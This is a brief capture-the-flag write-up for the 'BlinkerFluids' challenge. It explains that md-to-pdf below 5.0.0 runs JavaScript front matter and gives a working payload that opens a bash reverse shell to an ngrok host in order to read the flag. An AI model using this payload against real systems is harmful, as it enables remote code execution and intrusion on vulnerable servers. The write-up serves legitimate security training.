# BlinkerFluids
## Recon
The application uses `md-to-pdf` to render Markdown as PDF invoices. Versions < 5.0.0 are prone to RCE because the gray-matter engine is enabled by default (allowing arbitrary javascript code to be executed).

## Foothold
Payload (line-breaks are important):
```
---js
((require("child_process")).execSync("bash -c 'bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/14432 0>&1'"))
---RCE
```

This gives us a reverse shell allowing us to `cat /flag.txt`.